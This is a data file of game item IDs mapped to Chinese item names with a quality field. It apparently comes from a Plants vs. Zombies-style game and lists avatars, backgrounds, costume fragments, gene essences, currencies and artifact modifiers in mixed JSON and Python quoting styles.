{"25735":"限时召唤铜奖(球果训练家)头像","pinzhi":"lvse"},
{"25736":"限时召唤参与者1(球果训练家)头像","pinzhi":"lvse"},
{"25737":"限时召唤参与者2(球果训练家)头像","pinzhi":"lvse"},
{"25738":"限时召唤参与者3(球果训练家)头像","pinzhi":"lvse"},
{"25739":"限时召唤纪念头像(球果训练家)头像","pinzhi":"lvse"},
{"25740":"魔豆收藏家(枫影剑客)头像","pinzhi":"lvse"},
{"25741":"奇珍异宝头像","pinzhi":"lvse"},
{"25742":"掠夺为王头像","pinzhi":"lvse"},
{"25743":"2024金葵奖头像","pinzhi":"lvse"},
{"25744":"2025金葵奖头像","pinzhi":"lvse"},
{"25745":"周年秘境征服者头像","pinzhi":"lvse"},
{"25746":"宁静之夜头像","pinzhi":"lvse"},
{"25747":"逐梦童心头像","pinzhi":"lvse"},
{"25748":"限时召唤金奖(黑法师)头像","pinzhi":"lvse"},
{"25749":"限时召唤银奖(黑法师)头像","pinzhi":"lvse"},
{"25750":"限时召唤铜奖(黑法师)头像","pinzhi":"lvse"},
{"25751":"限时召唤参与者1(黑法师)头像","pinzhi":"lvse"},
{"25752":"限时召唤参与者2(黑法师)头像","pinzhi":"lvse"},
{"25753":"限时召唤参与者3(黑法师)头像","pinzhi":"lvse"},
{"25754":"限时召唤纪念头像(黑法师)头像","pinzhi":"lvse"},
{"25755":"废土改装头像","pinzhi":"lvse"},
{"25756":"生生不息头像","pinzhi":"lvse"},
{"25757":"魔豆收藏(海神草)头像","pinzhi":"lvse"},
{"25758":"Z公司征服者头像","pinzhi":"lvse"},
{"25759":"街机时刻头像","pinzhi":"lvse"},
{"25760":"熬夜冠军头像","pinzhi":"lvse"},
{"25761":"神奇口袋头像","pinzhi":"lvse"},
{"25762":"璀璨姬珊瑚头像","pinzhi":"lvse"},
{"25763":"限时召唤金奖(太极木槿)头像","pinzhi":"lvse"},
{"25764":"限时召唤银奖(太极木槿)头像","pinzhi":"lvse"},
{"25765":"限时召唤铜奖(太极木槿)头像","pinzhi":"lvse"},
{"25766":"限时召唤参与者1(太极木槿)头像","pinzhi":"lvse"},
{"25767":"限时召唤参与者2(太极木槿)头像","pinzhi":"lvse"},
{"25768":"限时召唤参与者3(太极木槿)头像","pinzhi":"lvse"},
{"25769":"限时召唤纪念头像(太极木槿)头像","pinzhi":"lvse"},
{"25770":"魔豆收藏家(百宝兜兰)头像","pinzhi":"lvse"},
{"25771":"仰望星空头像","pinzhi":"lvse"},
{"25772":"雪域奇遇头像","pinzhi":"lvse"},
{"25773":"神秘药剂头像","pinzhi":"lvse"},
{"25774":"究极进化头像","pinzhi":"lvse"},
{"25775":"异界穿梭头像","pinzhi":"lvse"},
{"25776":"万圣节秘境征服者头像","pinzhi":"lvse"},
{"25777":"硕果累累头像","pinzhi":"lvse"},
{"25778":"毒者仁心头像","pinzhi":"lvse"},
{"25779":"限时召唤金奖(毁灭菇)头像","pinzhi":"lvse"},
{"25780":"限时召唤银奖(毁灭菇)头像","pinzhi":"lvse"},
{"25781":"限时召唤铜奖(毁灭菇)头像","pinzhi":"lvse"},
{"25782":"限时召唤参与者(毁灭菇)1头像","pinzhi":"lvse"},
{"25783":"限时召唤参与者(毁灭菇)2头像","pinzhi":"lvse"},
{"25784":"限时召唤参与者(毁灭菇)3头像","pinzhi":"lvse"},
{"25785":"限时召唤(毁灭菇)纪念头像","pinzhi":"lvse"},
{"25786":"魔豆收藏家(黑法师)头像","pinzhi":"lvse"},
{"25787":"绘生绘色头像","pinzhi":"lvse"},
{"25788":"沉默是金头像","pinzhi":"lvse"},
{"25789":"依水遨游头像","pinzhi":"lvse"},
{"61000":"首席创作家背景","pinzhi":"lvse"},
{"61001":"童话森林背景","pinzhi":"lvse"},
{"61002":"锦鲤背景","pinzhi":"lvse"},
{"61003":"春来背景","pinzhi":"lvse"},
{"61004":"虹兔背景","pinzhi":"lvse"},
{"61005":"闪亮登场背景","pinzhi":"lvse"},
{"61006":"立夏背景","pinzhi":"lvse"},
{"61007":"海滩背景","pinzhi":"lvse"},
{"61008":"街头涂鸦背景","pinzhi":"lvse"},
{"61009":"夏日森林背景","pinzhi":"lvse"},
{"61010":"赏月背景","pinzhi":"lvse"},
{"61011":"周年庆典背景","pinzhi":"lvse"},
{"61012":"争论背景","pinzhi":"lvse"},
{"61013":"合影背景","pinzhi":"lvse"},
{"61014":"发现河姆渡背景","pinzhi":"lvse"},
{"61015":"圣诞雪景背景","pinzhi":"lvse"},
{"61016":"欢庆春节背景","pinzhi":"lvse"},
{"61017":"一决高下背景","pinzhi":"lvse"},
{"61018":"春柳背景","pinzhi":"lvse"},
{"61019":"谷雨背景","pinzhi":"lvse"},
{"61020":"小满背景","pinzhi":"lvse"},
{"61021":"蝉鸣背景","pinzhi":"lvse"},
{"61022":"彼岸背景","pinzhi":"lvse"},
{"61023":"盛夏登高背景","pinzhi":"lvse"},
{"61024":"炎炎夏日背景","pinzhi":"lvse"},
{"61025":"欢乐滑梯背景","pinzhi":"lvse"},
{"61026":"飞车假日背景","pinzhi":"lvse"},
{"61027":"拾忆周年背景","pinzhi":"lvse"},
{"61028":"扬帆起航背景","pinzhi":"lvse"},
{"61029":"头号玩家背景","pinzhi":"lvse"},
{"61030":"秋钓背景","pinzhi":"lvse"},
{"61031":"悠闲午后背景","pinzhi":"lvse"},
{"61032":"死亡凝视背景","pinzhi":"lvse"},
{"61033":"滑雪大冒险背景","pinzhi":"lvse"},
{"61034":"烟花易冷背景","pinzhi":"lvse"},
{"61035":"金蛇狂舞背景","pinzhi":"lvse"},
{"61036":"智慧之视背景","pinzhi":"lvse"},
{"61037":"别忘了绅士背景","pinzhi":"lvse"},
{"61038":"圣诞快乐背景","pinzhi":"lvse"},
{"61039":"万物复苏背景","pinzhi":"lvse"},
{"61040":"惊喜派对背景","pinzhi":"lvse"},
{"61041":"一路向西背景","pinzhi":"lvse"},
{"61042":"繁星舞动背景","pinzhi":"lvse"},
{"61043":"星空遨游背景","pinzhi":"lvse"},
{"61044":"气功教主背景","pinzhi":"lvse"},
{"61045":"海底万里背景","pinzhi":"lvse"},
{"61046":"潜植入海背景","pinzhi":"lvse"},
{"61047":"甜蜜时刻背景","pinzhi":"lvse"},
{"61048":"公司奇遇背景","pinzhi":"lvse"},
{"61049":"一夫当关背景","pinzhi":"lvse"},
{"61050":"月色当空背景","pinzhi":"lvse"},
{"61500":"惊魂万圣夜背景","pinzhi":"lvse"},
{"61501":"武侠国风背景","pinzhi":"lvse"},
{"61502":"青春活力背景","pinzhi":"lvse"},
{"61503":"无尽星空背景","pinzhi":"lvse"},{"200188":"未知植物","jieshu":"5","pinzhi":"lvse","zhuangban":[]},
{'42000253': '奶油生菜动物装扮碎片', 'pinzhi': 'default'},
{'42001372': '噗噗鱼藤耳机装扮碎片', 'pinzhi': 'default'},
{'40010933': '蚕豆突击队海盗旗装扮碎片', 'pinzhi': 'default'},
{'41110623': '槲寄冰仙子全身原色装扮碎片', 'pinzhi': 'default'},
{'41110624': '槲寄冰仙子全身炫彩装扮碎片', 'pinzhi': 'default'},
{'42000572': '长枪球兰红孩儿全身装扮碎片', 'pinzhi': 'default'},
{'42001004': '珊瑚泡泡姬全身炫彩装扮碎片', 'pinzhi': 'default'},
{'42001012': '百宝兜兰八字胡装扮碎片', 'pinzhi': 'default'},
{'42001332': '伏僵塔黄超级装扮碎片', 'pinzhi': 'default'},
{'31110624': '槲寄冰仙子全身炫彩装扮', 'pinzhi': 'default'},
{'32001004': '珊瑚泡泡姬全身炫彩装扮', 'pinzhi': 'default'},
{'23406': '初级年货装扮箱子', 'pinzhi': 'default'},
{'23411': '同游友谊币', 'pinzhi': 'default'},
{'23412': '元宝大作战元宝', 'pinzhi': 'default'},
{'23414': '黑洞', 'pinzhi': 'default'},
{'23415': '42号秘境黄币', 'pinzhi': 'default'},
{'23416': '42号秘境彩色币', 'pinzhi': 'default'},
{'23420': '派对助力券', 'pinzhi': 'default'},
{'23421': '时空礼盒金币', 'pinzhi': 'default'},
{'23423': '中级年货装扮箱子', 'pinzhi': 'default'},
{'23424': '高级年货装扮箱子', 'pinzhi': 'default'},
{'23425': '戴夫厨房玉米', 'pinzhi': 'default'},
{'23426': '戴夫厨房水', 'pinzhi': 'default'},
{'23427': '戴夫厨房蔬菜', 'pinzhi': 'default'},
{'23428': '戴夫厨房牛肉', 'pinzhi': 'default'},
{'300005': '国风怀古行绿水晶', 'pinzhi': 'default'},
{'300037': '火晶', 'pinzhi': 'default'},
{'83001': '豌豆射手基因精华', 'pinzhi': 'default'},
{'83002': '坚果基因精华', 'pinzhi': 'default'},
{'83003': '向日葵基因精华', 'pinzhi': 'default'},
{'83004': '土豆地雷基因精华', 'pinzhi': 'default'},
{'83005': '卷心菜投手基因精华', 'pinzhi': 'default'},
{'83006': '冰冻生菜基因精华', 'pinzhi': 'default'},
{'83007': '地刺基因精华', 'pinzhi': 'default'},
{'83008': '双向射手基因精华', 'pinzhi': 'default'},
{'83009': '玉米投手基因精华', 'pinzhi': 'default'},
{'83010': '火葫芦基因精华', 'pinzhi': 'default'},
{'83011': '白萝卜基因精华', 'pinzhi': 'default'},
{'83012': '竹笋基因精华', 'pinzhi': 'default'},
{'83013': '小喷菇基因精华', 'pinzhi': 'default'},
{'83014': '大喷菇基因精华', 'pinzhi': 'default'},
{'83015': '阳光豆基因精华', 'pinzhi': 'default'},
{'83016': '花生射手基因精华', 'pinzhi': 'default'},
{'83017': '黄金蓓蕾基因精华', 'pinzhi': 'default'},
{'83018': '磁力菇基因精华', 'pinzhi': 'default'},
{'83019': '仙桃基因精华', 'pinzhi': 'default'},
{'83020': '大丽菊基因精华', 'pinzhi': 'default'},
{'83021': '寒冰射手基因精华', 'pinzhi': 'default'},
{'83022': '闪电芦苇基因精华', 'pinzhi': 'default'},
{'83023': '西瓜投手基因精华', 'pinzhi': 'default'},
{'83024': '钢地刺基因精华', 'pinzhi': 'default'},
{'83026': '三重射手基因精华', 'pinzhi': 'default'},
{'83028': '甜薯基因精华', 'pinzhi': 'default'},
{'83029': '脉冲黄桃基因精华', 'pinzhi': 'default'},
{'83030': '月光花基因精华', 'pinzhi': 'default'},
{'83031': '爆炸坚果基因精华', 'pinzhi': 'default'},
{'83032': '冬瓜守卫基因精华', 'pinzhi': 'default'},
{'83033': '榴莲基因精华', 'pinzhi': 'default'},
{'83034': '树脂投手基因精华', 'pinzhi': 'default'},
{'83035': '大王花基因精华', 'pinzhi': 'default'},
{'83036': '复活萝卜基因精华', 'pinzhi': 'default'},
{'83037': '大蒜基因精华', 'pinzhi': 'default'},
{'83039': '樱桃炸弹基因精华', 'pinzhi': 'default'},
{'43041': '商店激光豆基因', 'pinzhi': 'default'},
{'83042': '全息坚果基因精华', 'pinzhi': 'default'},
{'83043': '大嘴花基因精华', 'pinzhi': 'default'},
{'83044': '南瓜巫师基因精华', 'pinzhi': 'default'},
{'83045': '三叶草基因精华', 'pinzhi': 'default'},
{'83046': '菜问基因精华', 'pinzhi': 'default'},
{'83047': '能量花基因精华', 'pinzhi': 'default'},
{'83048': '魔音甜菜基因精华', 'pinzhi': 'default'},
{'83049': '飓风甘蓝基因精华', 'pinzhi': 'default'},
{'83051': '双胞向日葵基因精华', 'pinzhi': 'default'},
{'83052': '原始向日葵基因精华', 'pinzhi': 'default'},
{'83053': '板栗小队基因精华', 'pinzhi': 'default'},
{'83054': '金蟾菇基因精华', 'pinzhi': 'default'},
{'83055': '电击蓝莓基因精华', 'pinzhi': 'default'},
{'83056': '豌豆迫击炮基因精华', 'pinzhi': 'default'},
{'83057': '向日葵歌手基因精华', 'pinzhi': 'default'},
{'83058': '甜菜护卫基因精华', 'pinzhi': 'default'},
{'83059': '杜英投手基因精华', 'pinzhi': 'default'},
{'83062': '猕猴桃基因精华', 'pinzhi': 'default'},
{'83063': '蚕豆突击队基因精华', 'pinzhi': 'default'},
{'83064': '缩小紫罗兰基因精华', 'pinzhi': 'default'},
{'83065': '气流水仙花基因精华', 'pinzhi': 'default'},
{'83066': '暗影豌豆基因精华', 'pinzhi': 'default'},
{'83067': '爆炸桔梗基因精华', 'pinzhi': 'default'},
{'83068': '槲寄冰仙子基因精华', 'pinzhi': 'default'},
{'83069': '猫尾草基因精华', 'pinzhi': 'default'},
{'83070': '火龙草基因精华', 'pinzhi': 'default'},
{'83071': '冰龙草基因精华', 'pinzhi': 'default'},
{'83072': '超能花菜基因精华', 'pinzhi': 'default'},
{'83074': '桑椹爆破手基因精华', 'pinzhi': 'default'},
{'83076': '冰西瓜投手基因精华', 'pinzhi': 'default'},
{'83078': '双生卯兔基因精华', 'pinzhi': 'default'},
{'83080': '豌豆药剂师基因精华', 'pinzhi': 'default'},
{'83081': '弹簧豆基因精华', 'pinzhi': 'default'},
{'83082': '路灯花基因精华', 'pinzhi': 'default'},
{'83083': '火炬树桩基因精华', 'pinzhi': 'default'},
{'83084': '豌豆荚基因精华', 'pinzhi': 'default'},
{'83085': '南瓜头基因精华', 'pinzhi': 'default'},
{'83086': '岩浆番石榴基因精华', 'pinzhi': 'default'},
{'83087': '变身茄子基因精华', 'pinzhi': 'default'},
{'83088': '小黄梨基因精华', 'pinzhi': 'default'},
{'83089': '瓷砖萝卜基因精华', 'pinzhi': 'default'},
{'83091': '缠绕水草基因精华', 'pinzhi': 'default'},
{'83092': '巴豆基因精华', 'pinzhi': 'default'},
{'83093': '火焰豌豆射手基因精华', 'pinzhi': 'default'},
{'83094': '旋转菠萝基因精华', 'pinzhi': 'default'},
{'83095': '石楠探索者基因精华', 'pinzhi': 'default'},
{'83096': '窝瓜基因精华', 'pinzhi': 'default'},
{'83097': '刺果流星锤基因精华', 'pinzhi': 'default'},
{'83098': '黄油毛茛基因精华', 'pinzhi': 'default'},
{'83099': '机枪豌豆基因精华', 'pinzhi': 'default'},
{'83101': '滴水冰莲基因精华', 'pinzhi': 'default'},
{'83102': '黄金叶基因精华', 'pinzhi': 'default'},
{'83104': '电离红掌基因精华', 'pinzhi': 'default'},
{'83105': '导向蓟基因精华', 'pinzhi': 'default'},
{'83106': '龙舌兰基因精华', 'pinzhi': 'default'},
{'83107': '铜钱草鼓手基因精华', 'pinzhi': 'default'},
{'83108': '逆时草基因精华', 'pinzhi': 'default'},
{'83110': '牛蒡击球手基因精华', 'pinzhi': 'default'},
{'50010': '精英豌豆家族', 'pinzhi': 'default'},
{'1046': '小樱桃', 'pinzhi': 'default'},
{'1048': '胡萝卜导弹车的导弹', 'pinzhi': 'default'},
{'1087': '小板栗', 'pinzhi': 'default'},
{'111057': '小爆炸坚果', 'pinzhi': 'default'},
{'111080': '仙人球', 'pinzhi': 'default'},
{'111083': '小冬青', 'pinzhi': 'default'},
{'200036': '像素豌豆', 'pinzhi': 'default'},
{'200040': '魔豆藤', 'pinzhi': 'default'},
{'200042': '青蛙', 'pinzhi': 'default'},
{'200087': '随机魔术帽', 'pinzhi': 'default'},
{'200103': '42号向日葵', 'pinzhi': 'default'},
{'200104': '42号豌豆射手', 'pinzhi': 'default'},
{'200105': '42号坚果墙', 'pinzhi': 'default'},
{'200106': '42号大嘴花', 'pinzhi': 'default'},
{'200107': '42号樱桃炸弹', 'pinzhi': 'default'},
{'200108': '42号冰冻生菜', 'pinzhi': 'default'},
{'200109': '42号菜问', 'pinzhi': 'default'},
{'200110': '42号月光花', 'pinzhi': 'default'},
{'200111': '42号毒影菇', 'pinzhi': 'default'},
{'200112': '42号暗樱草', 'pinzhi': 'default'},
{'200113': '42号夜影龙葵', 'pinzhi': 'default'},
{'200114': '42号幽暮投手', 'pinzhi': 'default'},
{'200115': '42号暗影射手', 'pinzhi': 'default'},
{'200116': '42号暗影荚兰', 'pinzhi': 'default'},
{'200117': '42号原始向日葵', 'pinzhi': 'default'},
{'200118': '42号原始豌豆射手', 'pinzhi': 'default'},
{'200119': '42号原始坚果墙', 'pinzhi': 'default'},
{'200120': '42号原始土豆地雷', 'pinzhi': 'default'},
{'200121': '42号南瓜罩', 'pinzhi': 'default'},
{'200122': '42号猫尾草', 'pinzhi': 'default'},
{'200123': '42号玉米投手', 'pinzhi': 'default'},
{'200124': '42号玉米加农炮', 'pinzhi': 'default'},
{'200125': '42号土豆雷', 'pinzhi': 'default'},
{'200129': '小守卫菇', 'pinzhi': 'default'},
{'200130': '41号双向射手', 'pinzhi': 'default'},
{'200131': '41号地刺', 'pinzhi': 'default'},
{'200132': '41号冰西瓜投手', 'pinzhi': 'default'},
{'200141': '祭司僵尸变的小喷菇', 'pinzhi': 'default'},
{'200144': '魔术帽(生产职业)', 'pinzhi': 'default'},
{'200145': '魔术帽(先锋职业Ⅰ)', 'pinzhi': 'default'},
{'200146': '魔术帽(先锋职业Ⅱ)', 'pinzhi': 'default'},
{'200147': '魔术帽(先锋职业Ⅲ)', 'pinzhi': 'default'},
{'200148': '魔术帽(先锋职业Ⅳ)', 'pinzhi': 'default'},
{'200149': '魔术帽(坚韧职业)', 'pinzhi': 'default'},
{'200150': '魔术帽(奇兵职业)', 'pinzhi': 'default'},
{'200151': '魔术帽(辅助职业)', 'pinzhi': 'default'},
{'200152': '魔术帽(远程职业Ⅰ)', 'pinzhi': 'default'},
{'200153': '魔术帽(远程职业Ⅱ)', 'pinzhi': 'default'},
{'200154': '魔术帽(远程职业Ⅲ)', 'pinzhi': 'default'},
{'200155': '魔术帽(远程职业Ⅳ)', 'pinzhi': 'default'},
{'200156': '魔术帽(远程职业Ⅴ)', 'pinzhi': 'default'},
{'200166': '秦始皇陵魔音甜菜', 'pinzhi': 'default'},
{'200168': '秦始皇陵胡萝卜导弹车', 'pinzhi': 'default'},
{'200171': '向日葵僵尸', 'pinzhi': 'default'},
{'200173': '42号毁灭菇', 'pinzhi': 'default'},
{'200174': '42号菠萝蜜帝', 'pinzhi': 'default'},
{'200180': '阳光鼠尾草', 'pinzhi': 'default'},
{'200181': '复制松果', 'pinzhi': 'default'},
{'62001': '红皇后卡牌', 'pinzhi': 'default'},
{'95003': '回归任务券', 'pinzhi': 'default'},
{'23405': '潘妮课堂币', 'pinzhi': 'default'},
{'300132': '超装多选一礼盒A', 'pinzhi': 'default'},
{'300146': '铜币', 'pinzhi': 'default'},
{'300147': '玉佩', 'pinzhi': 'default'},
{'300148': '初始阳光Ⅰ', 'pinzhi': 'default'},
{'300149': '初始阳光Ⅱ', 'pinzhi': 'default'},
{'300150': '初始阳光Ⅲ', 'pinzhi': 'default'},
{'300151': '初始能量豆Ⅰ', 'pinzhi': 'default'},
{'300152': '初始能量豆Ⅱ', 'pinzhi': 'default'},
{'300153': '攻击力提升Ⅰ', 'pinzhi': 'default'},
{'300154': '攻击力提升Ⅱ', 'pinzhi': 'default'},
{'300155': '攻击力提升Ⅲ', 'pinzhi': 'default'},
{'300156': '生命恢复Ⅰ', 'pinzhi': 'default'},
{'300157': '生命恢复Ⅱ', 'pinzhi': 'default'},
{'300158': '生命恢复Ⅲ', 'pinzhi': 'default'},
{'300159': '种植冷却减少1', 'pinzhi': 'default'},
{'300160': '种植冷却减少2', 'pinzhi': 'default'},
{'300161': '种植冷却减少3', 'pinzhi': 'default'},
{'300171': '趣味竞赛能量', 'pinzhi': 'default'},
{'300172': '水壶', 'pinzhi': 'default'},
{'300173': '趣味竞赛能量', 'pinzhi': 'default'},
{'300174': '鸭梨超装抽奖币', 'pinzhi': 'default'},
{'300175': '鸭梨超装兑换币', 'pinzhi': 'default'},
{'300176': '初级装扮宝箱', 'pinzhi': 'default'},
{'300177': '中级装扮宝箱', 'pinzhi': 'default'},
{'300178': '高级装扮宝箱', 'pinzhi': 'default'},
{'300179': '许愿币', 'pinzhi': 'default'},
{'300180': '敦煌兑换币', 'pinzhi': 'default'},
{'300181': '祥云券', 'pinzhi': 'default'},
{'300182': '41号秘境黄币', 'pinzhi': 'default'},
{'300183': '41号秘境彩色币', 'pinzhi': 'default'},
{'300184': '强化阳光', 'pinzhi': 'default'},
{'300185': '强化阳光', 'pinzhi': 'default'},
{'300188': '守卫菇超装抽奖币', 'pinzhi': 'default'},
{'300189': '守卫菇超装兑换币', 'pinzhi': 'default'},
{'300193': '幽冥玉佩', 'pinzhi': 'default'},
{'300195': '机枪豌豆强化Ⅰ', 'pinzhi': 'default'},
{'300196': '机枪豌豆强化Ⅱ', 'pinzhi': 'default'},
{'300197': '机枪豌豆强化Ⅲ', 'pinzhi': 'default'},
{'300212': '激光皇冠花抽奖币', 'pinzhi': 'default'},
{'300213': '激光皇冠花兑换币', 'pinzhi': 'default'},
{'300214': '椰球饮', 'pinzhi': 'default'},
{'61051': '终结之始背景', 'pinzhi': 'default'},
{'61052': '雪乡背景', 'pinzhi': 'default'},
{'61053': '杀僵事件背景', 'pinzhi': 'default'},
{'61054': '双旦有礼背景', 'pinzhi': 'default'},
{'61055': '帝王之怒背景', 'pinzhi': 'default'},
{'61056': '年年有余背景', 'pinzhi': 'default'},
{'61057': '春意看花背景', 'pinzhi': 'default'},
{'61058': '飞天奇迹背景', 'pinzhi': 'default'},
{'61059': '遨游古城背景', 'pinzhi': 'default'},
{'61060': '地宫镇魂背景', 'pinzhi': 'default'},
{'61062': '绿茵争锋背景', 'pinzhi': 'default'},
{'61063': '凌空抽射背景', 'pinzhi': 'default'},
{'61064': '心花怒放背景', 'pinzhi': 'default'},
{'61065': '夏日炎炎背景', 'pinzhi': 'default'},
{'61066': '一霸僵雄背景', 'pinzhi': 'default'},
{'61504': '僵僵小分队背景', 'pinzhi': 'default'},
{'61505': '雪橇小分队背景', 'pinzhi': 'default'},
{'61506': '寻迹敦煌背景', 'pinzhi': 'default'},
{'21079': '英雄王冠', 'pinzhi': 'default'},
{'22079': '英雄王冠碎片', 'pinzhi': 'default'},
{'21080': '粗制抑能链', 'pinzhi': 'default'},
{'22080': '粗制抑能链碎片', 'pinzhi': 'default'},
{'21081': '精制抑能链', 'pinzhi': 'default'},
{'22081': '精制抑能链碎片', 'pinzhi': 'default'},
{'1000': '攻击力增加(白)', 'pinzhi': 'default'},
{'2000': '持续时间增加(白)', 'pinzhi': 'default'},
{'2001': '持续时间增加(蓝)', 'pinzhi': 'default'},
{'2002': '持续时间增加(紫)', 'pinzhi': 'default'},
{'2003': '(唯一)所有神器持续时间增加', 'pinzhi': 'default'},
{'3000': '控制效果增加(白)', 'pinzhi': 'default'},
{'3001': '控制效果增加(蓝)', 'pinzhi': 'default'},
{'3002': '控制效果增加(紫)', 'pinzhi': 'default'},
{'3003': '(唯一)所有神器控制效果增加', 'pinzhi': 'default'},
{'4000': '冷却减少(白)', 'pinzhi': 'default'},
{'4001': '冷却减少(蓝)', 'pinzhi': 'default'},
{'4002': '冷却减少(紫)', 'pinzhi': 'default'},
{'4003': '(唯一)所有神器冷却减少', 'pinzhi': 'default'},
{'5002': '使用次数增加1(紫)', 'pinzhi': 'default'},
{'6000': '被动2冷却减少(白)', 'pinzhi': 'default'},
{'6001': '被动2冷却减少(蓝)', 'pinzhi': 'default'},
{'6002': '被动2冷却减少(紫)', 'pinzhi': 'default'},
{'6003': '(唯一)所有神器被动2冷却减少', 'pinzhi': 'default'},
{'7000': '被动1效果增加(白)', 'pinzhi': 'default'},
{'7001': '被动1效果增加(蓝)', 'pinzhi': 'default'},
{'7002': '被动1效果增加(紫)', 'pinzhi': 'default'},
{'7003': '(唯一)所有神器被动1效果增加', 'pinzhi': 'default'},
{'8003': '被动1全局生效', 'pinzhi': 'default'},
{'9003': '携带该神器时初始阳光增加100', 'pinzhi': 'default'},
{'10003': '携带该神器时第一次种植无冷却', 'pinzhi': 'default'},
{'42001800': '阳光鼠尾草伴生装扮碎片', 'pinzhi': 'default'},
{'42001810': '复制松果伴生装扮碎片', 'pinzhi': 'default'},
{'40010026': '向日葵萌映心梦超级装扮碎片', 'pinzhi': 'default'},
{'40010084': '双胞向日葵刀叉装扮碎片', 'pinzhi': 'default'},
{'40010223': '闪电芦苇麦克风装扮碎片', 'pinzhi': 'default'},
{'40011251': '豌豆荚3D眼镜装扮碎片', 'pinzhi': 'default'},
{'40010275': '双重射手赤子童心超级装扮碎片', 'pinzhi': 'default'},
{'40010402': '星星果假装天使装扮碎片', 'pinzhi': 'default'},
{'40010492': '小喷菇混的菇装扮碎片', 'pinzhi': 'default'},
{'41110042': '南瓜巫师姜饼人装扮碎片', 'pinzhi': 'default'},
{'41110212': '火焰花女王发条装扮碎片', 'pinzhi': 'default'},
{'41110491': '白瓜相扑手小书包装扮碎片', 'pinzhi': 'default'},
{'41112721': '寒冰醋栗护目镜装扮碎片', 'pinzhi': 'default'},
{'41110903': '熊果臼炮沙僧装扮碎片', 'pinzhi': 'default'},
{'42000481': '突击竹兵路障装扮碎片', 'pinzhi': 'default'},
{'42000514': '激光皇冠花暮隐魂灯超级装扮碎片', 'pinzhi': 'default'},
{'42000551': '豌豆药剂师红眼镜装扮碎片', 'pinzhi': 'default'},
{'42000651': '流星花假装恶魔装扮碎片', 'pinzhi': 'default'},
{'42000663': '曼德拉草飞翼装扮碎片', 'pinzhi': 'default'},
{'42000693': '粉丝心叶兰四面八汤超级装扮碎片', 'pinzhi': 'default'},
{'42000711': '蜜蜂铃兰尖头帽装扮碎片', 'pinzhi': 'default'},
{'42000923': '留声曼陀罗音响装扮碎片', 'pinzhi': 'default'},
{'42000931': '疯狂炮仗花成长装扮碎片', 'pinzhi': 'default'},
{'42001421': '盒子草礼炮太阳伞装扮碎片', 'pinzhi': 'default'},
{'42001572': '胆小菇星夜伴眠原色装扮碎片', 'pinzhi': 'default'},
{'42001573': '胆小菇星夜伴眠幻彩装扮碎片', 'pinzhi': 'default'},
{'42001593': '太极木槿女仆装幻彩装扮碎片', 'pinzhi': 'default'},
{'42001621': '叶子保护伞伞伞装扮碎片', 'pinzhi': 'default'},
{'42001633': '鸭梨被遗忘之王装扮碎片', 'pinzhi': 'default'},
{'42001642': '金蝉花小风车装扮碎片', 'pinzhi': 'default'},
{'42001701': '悬浮洋芋太空土豆装扮碎片', 'pinzhi': 'default'},
{'42001721': '祥云飞莲蝴蝶结装扮碎片', 'pinzhi': 'default'},
{'42001751': '吸金磁拉夫领装扮碎片', 'pinzhi': 'default'},
{'42001791': '冰川菇白胡子装扮碎片', 'pinzhi': 'default'},
{'1246': '小樱桃伴生装扮', 'pinzhi': 'default'},
{'1248': '胡萝卜导弹车的导弹伴生装扮', 'pinzhi': 'default'},
{'1287': '小板栗伴生装扮', 'pinzhi': 'default'},
{'111257': '小爆炸坚果伴生装扮', 'pinzhi': 'default'},
{'111280': '仙人球伴生装扮', 'pinzhi': 'default'},
{'111283': '小冬青伴生装扮', 'pinzhi': 'default'},
{'32000360': '像素豌豆伴生装扮', 'pinzhi': 'default'},
{'32000400': '魔豆藤伴生装扮', 'pinzhi': 'default'},
{'32000420': '青蛙伴生装扮', 'pinzhi': 'default'},
{'32000870': '随机魔术帽伴生装扮', 'pinzhi': 'default'},
{'32001030': '42号向日葵伴生装扮', 'pinzhi': 'default'},
{'32001040': '42号豌豆射手伴生装扮', 'pinzhi': 'default'},
{'32001050': '42号坚果墙伴生装扮', 'pinzhi': 'default'},
{'32001060': '42号大嘴花伴生装扮', 'pinzhi': 'default'},
{'32001070': '42号樱桃炸弹伴生装扮', 'pinzhi': 'default'},
{'32001080': '42号冰冻生菜伴生装扮', 'pinzhi': 'default'},
{'32001090': '42号菜问伴生装扮', 'pinzhi': 'default'},
{'32001100': '42号月光花伴生装扮', 'pinzhi': 'default'},
{'32001110': '42号毒影菇伴生装扮', 'pinzhi': 'default'},
{'32001120': '42号暗樱草伴生装扮', 'pinzhi': 'default'},
{'32001130': '42号夜影龙葵伴生装扮', 'pinzhi': 'default'},
{'32001140': '42号幽暮投手伴生装扮', 'pinzhi': 'default'},
{'32001150': '42号暗影射手伴生装扮', 'pinzhi': 'default'},
{'32001160': '42号暗影荚兰伴生装扮', 'pinzhi': 'default'},
{'32001170': '42号原始向日葵伴生装扮', 'pinzhi': 'default'},
{'32001180': '42号原始豌豆射手伴生装扮', 'pinzhi': 'default'},
{'32001190': '42号原始坚果墙伴生装扮', 'pinzhi': 'default'},
{'32001200': '42号原始土豆地雷伴生装扮', 'pinzhi': 'default'},
{'32001210': '42号南瓜罩伴生装扮', 'pinzhi': 'default'},
{'32001220': '42号猫尾草伴生装扮', 'pinzhi': 'default'},
{'32001230': '42号玉米投手伴生装扮', 'pinzhi': 'default'},
{'32001240': '42号玉米加农炮伴生装扮', 'pinzhi': 'default'},
{'32001250': '42号土豆雷伴生装扮', 'pinzhi': 'default'},
{'32001290': '小守卫菇伴生装扮', 'pinzhi': 'default'},
{'32001300': '41号双向射手伴生装扮', 'pinzhi': 'default'},
{'32001310': '41号地刺伴生装扮', 'pinzhi': 'default'},
{'32001320': '41号冰西瓜投手伴生装扮', 'pinzhi': 'default'},
{'32001410': '祭司僵尸变的小喷菇伴生装扮', 'pinzhi': 'default'},
{'32001440': '魔术帽(生产职业)伴生装扮', 'pinzhi': 'default'},
{'32001450': '魔术帽(先锋职业Ⅰ)伴生装扮', 'pinzhi': 'default'},
{'32001460': '魔术帽(先锋职业Ⅱ)伴生装扮', 'pinzhi': 'default'},
{'32001470': '魔术帽(先锋职业Ⅲ)伴生装扮', 'pinzhi': 'default'},
{'32001480': '魔术帽(先锋职业Ⅳ)伴生装扮', 'pinzhi': 'default'},
{'32001490': '魔术帽(坚韧职业)伴生装扮', 'pinzhi': 'default'},
{'32001500': '魔术帽(奇兵职业)伴生装扮', 'pinzhi': 'default'},
{'32001510': '魔术帽(辅助职业)伴生装扮', 'pinzhi': 'default'},
{'32001520': '魔术帽(远程职业Ⅰ)伴生装扮', 'pinzhi': 'default'},
{'32001530': '魔术帽(远程职业Ⅱ)伴生装扮', 'pinzhi': 'default'},
